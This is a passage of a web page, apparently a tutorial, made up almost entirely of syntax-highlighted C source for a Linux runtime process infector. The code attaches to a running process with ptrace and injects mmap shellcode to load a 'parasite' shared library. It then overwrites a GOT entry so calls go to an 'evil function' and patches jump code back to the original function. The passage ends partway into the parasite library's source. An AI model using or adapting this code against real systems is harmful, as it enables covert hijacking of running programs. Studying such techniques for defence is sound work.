&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%s is not an ELF file<span style="color: #000099; font-weight: bold;">\n</span>"</span>, file<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* we target executables only, althoug ET_DYN would be a viable target */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* as well */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ehdr-&gt;e_type != ET_EXEC &amp;&amp; ehdr-&gt;e_type != ET_DYN<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%s is not an executable or object file, cannot target process %d<span style="color: #000099; font-weight: bold;">\n</span>"</span>, file, pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ehdr-&gt;e_type == ET_DYN &amp;&amp; !et_dyn<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Target process is of type ET_DYN, but the '-d' option was not specified -- exiting...<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; phdr = <span style="color: black;">(</span>Elf32_Phdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_phoff<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get the base -- p_vaddr of text segment */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_phoff; i-- &gt; <span style="color: #cc66cc;">0</span>; phdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>phdr-&gt;p_type == PT_LOAD &amp;&amp; !phdr-&gt;p_offset<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elf_base = text_base = phdr-&gt;p_vaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; phdr++;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_segment = phdr-&gt;p_vaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed to attach to process<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get the symbol relocation information */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>lp = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>get_plt<span style="color: black;">(</span>mem<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"get_plt() failed<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* inject mmap shellcode into process to load lib */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>check_for_lib<span style="color: black;">(</span>EVILLIB, fd<span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting library<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>grsec<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; grsec_mmap_library<span style="color: black;">(</span>pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mmap_library<span style="color: black;">(</span>pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_attach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fclose<span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>fd = fopen<span style="color: black;">(</span>meminfo, <span style="color: #ff0000;">"r"</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"PID: %i cannot be checked, /proc/%i/maps does not exist<span style="color: #000099; font-weight: bold;">\n</span>"</span>, pid, pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Process %d appears to be infected, %s is mmap'd already<span style="color: #000099; font-weight: bold;">\n</span>"</span>, pid, EVILLIB<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>evilfunc = search_evil_lib<span style="color: black;">(</span>pid, evil_base<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Could not locate evil function<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Evil Function location: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Modifying GOT entry: replace &lt;%s&gt; with %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, <span style="color: #000000; font-weight: bold;">function</span>, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* overwrite GOT entry with addr to evilfunc (our replacement) */</span><br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; lp<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, <span style="color: #000000; font-weight: bold;">function</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>et_dyn<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dyn_mmap_got_addr = <span style="color: black;">(</span>evil_base + <span style="color: black;">(</span>lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> - elf_base<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;got_offset = <span style="color: black;">(</span>!et_dyn<span style="color: black;">)</span> ? lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> : dyn_mmap_got_addr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;export = memrw<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, got_offset, <span style="color: #cc66cc;">1</span>, pid, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>export == evilfunc<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Successfully modified GOT entry<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed at modifying GOT entry<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"New GOT value: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, export<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evil_code<span style="color: black;">[</span><span style="color: #cc66cc;">256</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> initial_bytes<span style="color: black;">[</span><span style="color: #cc66cc;">12</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> injection_vaddr = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get a copy of our replacement function and search for transfer sequence */</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>evil_code, evilfunc, <span style="color: #cc66cc;">256</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* once located, patch it with the addr of the original function */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">256</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, evil_code<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>evil_code<span style="color: black;">[</span>i<span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Located transfer code; patching it with %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, original<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; injection_vaddr = <span style="color: black;">(</span>evilfunc + i<span style="color: black;">)</span> + <span style="color: #cc66cc;">3</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!injection_vaddr<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Could not locate transfer code within parasite<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* patch jmp code with addr to original function */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>initial_bytes, injection_vaddr, INJECT_TRANSFER_CODE, pid, original<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Confirm transfer code: "</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">7</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\\</span>x%.2x"</span>, initial_bytes<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; puts<span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; done:<br>
&nbsp; &nbsp; &nbsp; &nbsp; munmap<span style="color: black;">(</span>mem, st.<span style="color: #202020;">st_size</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; close<span style="color: black;">(</span>md<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; fclose<span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Here is the example shared object parasite</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* libtest.c */</span><br>
<br>
<span style="color: #339933;">#include &lt;sys/syscall.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span><br>
<br>
<span style="color: #993333;">int</span> evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>;<br>
<br>
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span><br>
_write <span style="color: black;">(</span><span style="color: #993333;">int</span> fd, <span style="color: #993333;">void</span> *buf, <span style="color: #993333;">int</span> count<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; <span style="color: #993333;">long</span> ret;<br>
<br>
&nbsp; __asm__ __volatile__ <span style="color: black;">(</span><span style="color: #ff0000;">"pushl %%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"movl %%esi,%%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"int $0x80<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span> <span style="color: #ff0000;">"popl %%ebx"</span>:<span style="color: #ff0000;">"=a"</span> <span style="color: black;">(</span>ret<span style="color: black;">)</span><br>
